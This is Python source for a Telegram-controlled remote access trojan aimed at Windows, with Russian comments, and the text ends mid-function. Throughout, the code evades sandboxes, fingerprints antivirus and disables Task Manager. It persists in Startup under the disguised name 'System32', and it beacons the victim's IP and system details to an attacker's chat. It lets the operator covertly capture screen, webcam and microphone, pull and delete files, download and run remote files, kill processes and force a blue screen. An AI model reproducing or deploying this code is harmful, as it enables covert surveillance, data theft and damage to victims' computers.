# -*- coding: utf8 -*-

import re
import os
import sys
import cv2
import wave
import glob
import time
import shutil
import telebot
import sqlite3
import pyaudio
import requests
import platform
import pyperclip
import webbrowser
import subprocess
import win32crypt
import json,base64
import urllib.request
from PIL import ImageGrab
from telebot import types
from telebot import util
from telebot import apihelper
from ctypes import *
from ctypes.wintypes import *
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from urllib.error import HTTPError
from win32gui import GetWindowText, GetForegroundWindow
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from subprocess import Popen, PIPE



#Токен/Айди
TelegramToken = 'TOKEN'
TelegramChatID = 'ID'

#Прокси (True / False)
Proxy = False
Ip = 'Ip'
Port = 'Proxy'


#Отключать Диспетчер Задач при первом запуске (True / False)
DisableTaskManager = False
#Всегда запускать от имени администратора (True / False)
AdminRightsRequired = False


#Добавлять в автозагрузку при первом запуске (True / False)
AutorunEnabled = False
#Название файла при копировании в автозагрузку
AutorunName = 'System32'


#Выводить сообщение при запуске (True / False)
DisplayMessageBox = False
#Заголовок сообщения
MessageHeader = 'MessageHeader'
#Сообщение
Message = 'Message'



bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/Video\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/AutoRun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Выключить - ⛔️', callback_data='poweroff')
button2 = types.InlineKeyboardButton('Перезагрузить - ⭕️', callback_data='reboot')
button3 = types.InlineKeyboardButton('Синий экран смерти - 🌀', callback_data='bsod')
button4 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Сохранить - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Удалить - ♻️', callback_data='uninstall')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Да, удалить', callback_data='confirm')
button2 = types.InlineKeyboardButton('Не удалять', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button2, button3)
main5.row(button4)
main5.row(button5, button6)

main6 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Остановить все процессы', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Отключить диспетчер задач', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/Ls\n📄')
button4 = types.KeyboardButton('/Remove\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Voice\n📢')
button6 = types.KeyboardButton('/OpenURL\n🌐')
button7 = types.KeyboardButton('/Wallpapers\n🧩')
button8 = types.KeyboardButton('/ForkBomb\n⏱')
main8.row(button1, button2, button3)
main8.row(button4, button5)
main8.row(button6, button7, button8)


for file in glob.glob('C:\\Users\\John\\Desktop\\foobar.*'):
   sys.exit()
for file in glob.glob('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
   sys.exit()


if os.path.exists('C:\\Program Files\\Windows Defender'):
   av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
   av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
   av = 'AVG'
if os.path.exists('C:\\Program Files (x86)\\Avira\\Launcher'):
   av = 'Avira'
if os.path.exists('C:\\Program Files (x86)\\IObit\\Advanced SystemCare'):
   av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
   av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\DrWeb'):
   av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
   av = 'ESET'
if os.path.exists('C:\\Program Files (x86)\\Kaspersky Lab'):
   av = 'Kaspersky'
if os.path.exists('C:\\Program Files (x86)\\360\\Total Security'):
   av = '360 Total Security'
else:
   pass




if Proxy is True:
 apihelper.proxy = {'https': 'socks5://{}:{}'.format(Ip,Port)}

if AdminRightsRequired is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  while True:
   try:
    os.startfile(sys.argv[0], 'runas')
   except:
    pass
   else:
    break

if DisableTaskManager is True:
 try:
  if os.path.exists(os.environ['ProgramData'] + '\\regedit.bat'):
   pass
  else:
   directory = os.environ['ProgramData']
   with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
   	OPATH.writelines([
   	    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
   	    'Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
   	    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
   	    'Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
   while True:
    try:
     os.startfile(os.environ['ProgramData'] + '\\regedit.bat', 'runas')
    except:
     pass
    else:
     break
 except:
    pass

if AutorunEnabled is True:
 try:
  fname = AutorunName + os.path.splitext(os.path.basename(sys.argv[0]))[1]
  path = os.environ['AppData'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
  file = os.path.basename(sys.argv[0])
  if os.path.exists(path + fname):
   pass
  else:
   shutil.copy2((sys.argv[0]), r'' + path)
   os.rename(path + os.path.basename(sys.argv[0]), path + fname)
   os.utime(path + fname,(1330712280, 1330712292))
   try:
    if AdminRightsRequired is True:
     os.startfile(path + fname, 'runas')
    else:
     os.startfile(path + fname)
   except:
    pass
 except:
  pass

if DisplayMessageBox is True:
 try:
  if os.path.exists(os.environ['ProgramData'] + '\\MessageBox'):
  	pass
  else:
  	open(os.environ['ProgramData'] + '\\MessageBox', 'a').close()
  	ctypes.windll.user32.MessageBoxW(0, Message, u''+MessageHeader, 0x30)
 except:
 	pass



while True:
 try:
  try:
   admin = os.getuid() == 0
  except AttributeError:
   admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
  if admin is True:
   Online = '🔘 Online!'
  else:
   Online = '🟢 Online!'

  r = requests.get('http://ip.42.pl/raw')
  IP = r.text
  bot.send_message(TelegramChatID, 
  '\n' + Online +
  '\n' + '\nPC » ' + os.getlogin() + 
  '\nOS » ' + platform.system() + ' ' + platform.release() + 
  '\n'
  '\nAV » ' + av +
  '\n'
  '\nIP » ' + IP,
  reply_markup=menu)

  if os.path.exists(os.environ['ProgramData'] + '\\Files'):
    pass
  else:
    os.makedirs(os.environ['ProgramData'] + '\\Files')
    os.makedirs(os.environ['ProgramData'] + '\\Files\\Documents')
    os.makedirs(os.environ['ProgramData'] + '\\Files\\Photos')
 except:
   print('[-] › Нет подключения')
 else:
   print('[+] › Подключено')
   break

@bot.message_handler(commands=['3', '6'])
def main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['2', '5'])
def main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['4', '1'])
def main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Power', 'power'])
def power(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main2, parse_mode="Markdown")

@bot.message_handler(commands=['AutoRun', 'autorun'])
def autorun(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main3, parse_mode="Markdown")

@bot.message_handler(commands=['Files', 'files'])
def files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")

@bot.message_handler(commands=['Cancel'])
def cancelfiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['Start', 'start', 'Help', 'help'])
def help(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id,
  'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
  '\n'
  '\n'
  '\n/Screen -  Скриншот экрана'
  '\n/Webcam - Фото с вебки'
  '\n/Video - Видео с вебки'
  '\n/Audio - Запись микрофона'
  '\n/Power - Управление питанием'
  '\n/AutoRun - Автозагрузка'
  '\n'
  '\n/Files - Файловый менеджер'
  '\n› /CD - Текущая директория'
  '\n› /ls - Список файлов'
  '\n› /Remove - Удалить файл'
  '\n› /Upload - Загрузить файл'
  '\n› /Download - Скачать файл'
  '\n› /Run - Запустить файл'
  '\n/Tasklist - Список процессов'
  '\n/Taskkill - Остановить процесс'
  '\n'
  '\n/Message - Отправить сообщение'
  '\n/Voice - Озвучить сообщение'
  '\n/OpenURL - Открыть ссылку'
  '\n/Wallpapers - Установить обои'
  '\n/ForkBomb - Запуск программ'
  '\n'
  '\n/Passwords - Получить пароли'
  '\n/Clipboard - Буфер обмена'
  '\n/CMD - Выполнить команду'
  '\n'
  '\n'
  '\n_Coded by Bainky_ | *@bainki* 👾', 
  reply_markup=menu, parse_mode="Markdown")




@bot.message_handler(regexp='/Screen')
def screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  screen = ImageGrab.grab()
  screen.save(os.environ['ProgramData'] + '\\Screenshot.jpg')
  screen = open(os.environ['ProgramData'] + '\\Screenshot.jpg', 'rb')
  bot.send_photo(command.chat.id, screen)
  screen.close()
  os.remove(os.environ['ProgramData'] + '\\Screenshot.jpg')
 except:
  pass

@bot.message_handler(regexp='/Webcam')
def webcam(command):
 try:
  cap = cv2.VideoCapture(0)
  for i in range(30):
     cap.read()
  ret, frame = cap.read()
  cv2.imwrite(os.environ['ProgramData'] + '\\Webcam.jpg', frame)
  bot.send_chat_action(command.chat.id, 'upload_photo') 
  cap.release()
  webcam = open(os.environ['ProgramData'] + '\\Webcam.jpg', 'rb')
  bot.send_photo(command.chat.id, webcam)
  webcam.close()
  os.remove(os.environ['ProgramData'] + '\\Webcam.jpg')
 except:
 	bot.send_chat_action(command.chat.id, 'typing')
 	bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")

@bot.message_handler(regexp='/Video')
def video(command):
 try:
  msg = re.split('/Video ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Записываем...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_video')
  try:
   capture_duration = float(msg)
   cap = cv2.VideoCapture(0)
   fourcc = cv2.VideoWriter_fourcc(*'XVID')
   out = cv2.VideoWriter(os.environ['ProgramData'] + '\\Video.mp4',fourcc, 20.0, (640,480))
   start_time = time.time()
   while( int(time.time() - start_time) < capture_duration ):
      ret, frame = cap.read()
      if ret==True:
          frame = cv2.flip(frame,1)
          out.write(frame)
      else:
          break
   cap.release()
   out.release()
   cv2.destroyAllWindows()
   video = open(os.environ['ProgramData'] + '\\Video.mp4', 'rb')
   bot.send_animation(command.chat.id, video)
   video.close()
   os.remove(os.environ['ProgramData'] + '\\Video.mp4')
  except:
   bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")
 except:
   bot.send_chat_action(command.chat.id, 'typing')
   bot.send_message(command.chat.id, '*Укажите длительность записи\n\n› /Video*', parse_mode="Markdown")

@bot.message_handler(regexp='/Audio')
def audio(command):
 try:
  msg = re.split('/Audio ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Записываем...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'record_audio')
  try:
   CHUNK = 1024
   FORMAT = pyaudio.paInt16
   CHANNELS = 2
   RATE = 44100
   RECORD_SECONDS = float(msg)
   WAVE_OUTPUT_FILENAME = os.environ['ProgramData'] + '\\Voice.wav'
   p = pyaudio.PyAudio()
   stream = p.open(format=FORMAT,
                  channels=CHANNELS,
                  rate=RATE,
                  input=True,
                  frames_per_buffer=CHUNK)
   frames = []
   for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
      data = stream.read(CHUNK)
      frames.append(data)
   stream.stop_stream()
   stream.close()
   p.terminate()
   wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
   wf.setnchannels(CHANNELS)
   wf.setsampwidth(p.get_sample_size(FORMAT))
   wf.setframerate(RATE)
   wf.writeframes(b''.join(frames))
   wf.close()
   voice = open(os.environ['ProgramData'] + '\\Voice.wav', 'rb')
   bot.send_voice(command.chat.id, voice)
   voice.close()
   os.remove(os.environ['ProgramData'] + '\\Voice.wav')
  except:
   bot.send_message(command.chat.id, '*Не удалось записать аудио*', parse_mode="Markdown") 
 except:
  bot.send_message(command.chat.id, '*Укажите длительность записи\n\n› /Audio*', parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
 if call.message:
  if call.data == 'poweroff':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
      subprocess.Popen('shutdown -s /t 0 /f')
    except:
      pass

  if call.data == 'reboot':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
      subprocess.Popen('shutdown -r /t 0 /f')
    except:
      pass

  if call.data == 'bsod':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
      tmp1 = c_bool()
      tmp2 = DWORD()
      ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
      ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
    except:
      pass

  if call.data == 'startup':
    try:
      fname = AutorunName + os.path.splitext(os.path.basename(sys.argv[0]))[1]
      path = os.environ['AppData'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
      file = os.path.basename(sys.argv[0])
      if os.path.exists(path + fname):
        bot.edit_message_text(chat_id=call.message.chat.id,
        message_id=call.message.message_id, text='*' + fname + '* уже находится в автозагрузке!', parse_mode="Markdown")
      else:
        shutil.copy2((sys.argv[0]), r'' + path)
        bot.edit_message_text(chat_id=call.message.chat.id,
        message_id=call.message.message_id, text='*' + file + '* скопирован в автозагрузку!', parse_mode="Markdown")
        os.rename(path + os.path.basename(sys.argv[0]), path + fname)
        bot.edit_message_text(chat_id=call.message.chat.id,
        message_id=call.message.message_id, text='*' + file + '* переименован в *' + fname + '*', parse_mode="Markdown")
        os.utime(path + fname,(1330712280, 1330712292))
        os.startfile(path + fname)
        bot.edit_message_text(chat_id=call.message.chat.id,
        message_id=call.message.message_id, text='*' + fname + '* запущен из автозагрузки!', parse_mode="Markdown")
    except:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")

  if call.data == 'uninstall':
    bot.edit_message_text(chat_id=call.message.chat.id,
    message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main4, parse_mode="Markdown")

  if call.data == 'confirm':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Завершаем текущий процесс...*', parse_mode="Markdown")
      time.sleep(2)
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*' + os.path.basename(sys.argv[0]) + '* удален!', parse_mode="Markdown")
      directory = os.environ['ProgramData']
      with open(os.path.join(directory, 'uninstaller.bat'), 'w') as OPATH:
        OPATH.writelines(['taskkill /f /im "' + os.path.basename(sys.argv[0]) + '"\n', 
                          'timeout 1\n', 
                          'del /s /q "', sys.argv[0]])
      os.startfile(os.environ['ProgramData'] + '\\uninstaller.bat')
    except:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")

  if call.data == 'taskkill all':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
      directory = os.environ['ProgramData']
      with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
          OPATH.writelines([
            'if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
            'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq '
            '%username%" /fi "IMAGENAME ne "' + os.path.basename(sys.argv[0]) + '"'])
      os.startfile(os.environ['ProgramData'] + '\\taskkill.bat')
      bot.edit_message_text(chat_id=call.message.chat.id,
      message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
    except:
      pass

  if call.data == 'disabletaskmgr':
    try:
      if os.path.exists(os.environ['ProgramData'] + '\\regedit.bat'):
        bot.edit_message_text(chat_id=call.message.chat.id,
        message_id=call.message.message_id, text='*Диспетчер задач уже отключен!*', parse_mode="Markdown")
      else:
       directory = os.environ['ProgramData']
       with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
           OPATH.writelines([
             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
             'Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
             'Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
       while True:
          try:
           os.startfile(os.environ['ProgramData'] + '\\regedit.bat', 'runas')
          except:
           pass
          else:
           bot.edit_message_text(chat_id=call.message.chat.id,
           message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
           break
    except:
      pass

@bot.message_handler(regexp='/CD')
def cd(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/CD ', command.text, flags=re.I)[1]
  os.chdir(msg)
  bot.send_message(command.chat.id, '*Директория изменена*\n\n`' + os.getcwd() + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Директория не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Текущая директория*\n\n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(regexp='/ls')
def ls(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  dirs = '\n``'.join(os.listdir(path="."))
  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + dirs + '`', parse_mode="Markdown")
 except:
  try:
    bot.send_chat_action(command.chat.id, 'typing')
    dirse = '\n'.join(os.listdir(path="."))
    splitted_text = util.split_string(dirse, 4096)
    for dirse in splitted_text:
      bot.send_message(command.chat.id, '`' + dirse + '`', parse_mode="Markdown")
  except:
    pass

@bot.message_handler(commands=['Remove', 'remove'])
def remove(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/Remove ', command.text, flags=re.I)[1]
  created = os.path.getctime(os.getcwd() + '\\' + msg)
  year,month,day,hour,minute,second=time.localtime(created)[:-3]
  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return "%3.1f %s" % (num, x)
          num /= 1024.0
  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)
  bot.send_message(command.chat.id, 
    'Файл *' + msg + '* удален!' 
    '\n' 
    '\nСоздан » %02d/%02d/%d'%(day,month,year) +
    '\nРазмер » ' + file_size(os.getcwd() + '\\' + msg),
    parse_mode="Markdown")
  os.remove(os.getcwd() + '\\' + msg)
 except:
  try:
    bot.send_chat_action(command.chat.id, 'typing')
    created = os.path.getctime(os.getcwd() + '\\' + msg)
    year,month,day,hour,minute,second=time.localtime(created)[:-3]
    folder = os.getcwd() + '\\' + msg
    folder_size = 0
    for (path, dirs, files) in os.walk(folder):
      for file in files:
        filename = os.path.join(path, file)
        folder_size += os.path.getsize(filename)
    files = folders = 0
    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + msg):
        files += len(filenames)
        folders += len(dirnames)
    shutil.rmtree(os.getcwd() + '\\' + msg)
    bot.send_message(command.chat.id, 
      'Папка *' + msg + '* удалена!'
      '\n'
      '\nСоздана » %02d/%02d/%d'%(day,month,year) +
      '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
      '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
      parse_mode="Markdown")
  except FileNotFoundError:
  	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except PermissionError:
  	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
  	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Remove • /RemoveAll*', parse_mode="Markdown")

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def removeall(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '*Удаляем...*', parse_mode="Markdown")
  folder = os.getcwd()
  folder_size = 0
  for (path, dirs, files) in os.walk(folder):
    for file in files:
      filename = os.path.join(path, file)
      folder_size += os.path.getsize(filename)
  files = folders = 0
  for _, dirnames, filenames in os.walk(os.getcwd()):
      files += len(filenames)
      folders += len(dirnames)
  a = (len(glob.glob('*')))
  try:
   for file in glob.glob('*.*'):
    if os.path.isfile(file):
      os.remove(file)
   for directory in glob.glob('*/'):
    if os.path.exists(directory):
      shutil.rmtree(directory)
  except PermissionError:
     pass
  b = (len(glob.glob('*')))
  c = (a - b)
  bot.send_message(command.chat.id,
     'Удалено *' + str(c) + '* файлов из *' + str(a) + '*!'
     '\n'
     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
     '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
     parse_mode="Markdown")
 except:
  pass

@bot.message_handler(regexp='/Upload')
def upload(command):
 try:
  msg = re.split('/Upload ', command.text, flags=re.I)[1]
  url = msg
  req = urllib.request.Request(url, method='HEAD')
  r = urllib.request.urlopen(req)
  file_name = os.environ['ProgramData'] + '\\Files\\' + r.info().get_filename()
  bot.send_message(command.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
  urllib.request.urlretrieve(url, file_name)
  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`' + file_name + '`', parse_mode="Markdown")
 except urllib.error.HTTPError as err:
  bot.send_message(command.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
 except ValueError:
  bot.send_message(command.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n\n› /Upload*', parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def document(command):
 try:
  file_info = bot.get_file(command.document.file_id)
  bot.send_message(command.chat.id, '*Загружаем...*', parse_mode="Markdown")
  downloaded_file = bot.download_file(file_info.file_path)
  src = os.environ['ProgramData'] + '\\Files\\'+file_info.file_path;
  with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)
  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.reply_to(command, '*Формат файла не поддерживается*', parse_mode="Markdown")
 except:
  bot.reply_to(command, '*Вы не можете загрузить файл больше 20МБ*', parse_mode="Markdown")

@bot.message_handler(regexp='/Download')
def download(command):
 try:
  msg = re.split('/Download ', command.text, flags=re.I)[1]
  download = open(os.getcwd() + '\\' + msg, 'rb')
  bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_document')
  bot.send_document(command.chat.id, download)
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  try:
    msg = re.split('/Download ', command.text, flags=re.I)[1]
    bot.send_message(command.chat.id, '*Собираем...*', parse_mode="Markdown")
    shutil.make_archive(os.environ['ProgramData'] + msg,
                            'zip',
                            os.getcwd(),
                            msg)
    bot.send_chat_action(command.chat.id, 'upload_document')
    file = open(os.environ['ProgramData'] + msg + '.zip', 'rb')
    bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
    bot.send_document(command.chat.id, file)
    file.close()
    os.remove(os.environ['ProgramData'] + msg + '.zip')
  except PermissionError:
  	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
    try:
        file.close()
        os.remove(os.environ['ProgramData'] + msg + '.zip')
        bot.send_message(command.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
    except:
        bot.send_message(command.chat.id, '*Введите название файла\n\n› /Download*', parse_mode="Markdown")

@bot.message_handler(commands=['Run', 'run'])
def run(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/Run ', command.text, flags=re.I)[1]
  os.startfile(os.getcwd() + '\\' + msg)
  bot.send_message(command.chat.id, 'Файл *' + msg + '* открыт!', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
 	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")

@bot.message_handler(commands=['RunAS', 'runas'])
def runas(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/RunAS ', command.text, flags=re.I)[1]
  while True:
   try:
    os.startfile(os.getcwd() + '\\' + msg, 'runas')
   except:
   	pass
   else:
    bot.send_message(command.chat.id, 'Файл *' + msg + '* открыт!', parse_mode="Markdown")
    break
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")

@bot.message_handler(regexp='/Tasklist')
def tasklist(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  prs = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
  pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]
  pr_string = '\n'.join(pr_list)
  bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Не удалось получить список процессов*', parse_mode="Markdown")

@bot.message_handler(regexp='/Taskkill')
def taskkill(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/Taskkill ', command.text, flags=re.I)[1]
  subprocess.Popen('taskkill /f /im ' + msg + '.exe')
  bot.send_message(command.chat.id, 'Процесс *' + msg + "* остановлен!", parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, 
  '*Введите название процесса'
  '\n'
  '\n› /Taskkill'
  '\n'
  '\nАктивное окно*'
  '\n'
  '\n`' + GetWindowText(GetForegroundWindow()) + '`',
  reply_markup=main6, parse_mode="Markdown")

@bot.message_handler(regexp='/Message')
def message(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/Message ', command.text, flags=re.I)[1]
  bot.reply_to(command, '*Сообщение отправленно!*', parse_mode="Markdown")
  ctypes.windll.user32.MessageBoxW(0, msg, u'', 0x10)
 except:
  bot.send_message(command.chat.id, '*Введите сообщение\n\n› /Message*', parse_mode="Markdown")

@bot.message_handler(regexp='/OpenURL')
def openurl(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/OpenURL ', command.text, flags=re.I)[1]
  webbrowser.open_new_tab(msg)
  bot.reply_to(command, '*Ссылка открыта!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Вставьте ссылку\n\n› /OpenURL*', parse_mode="Markdown")

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def wallpapers(command):
 bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def wallpapers(command):
 try:
  file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
  downloaded_file = bot.download_file(file_info.file_path)
  src = os.environ['ProgramData'] + '\\Files\\' + file_info.file_path;
  with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)
  ctypes.windll.user32.SystemParametersInfoW(20, 0, os.environ['ProgramData'] + '\\Files\\' + file_info.file_path, 0)
  bot.reply_to(command, '*Фотография установлена на обои!*', parse_mode="Markdown")
  time.sleep(3)
  os.remove(os.environ['ProgramData'] + '\\Files\\' + file_info.file_path)
 except:
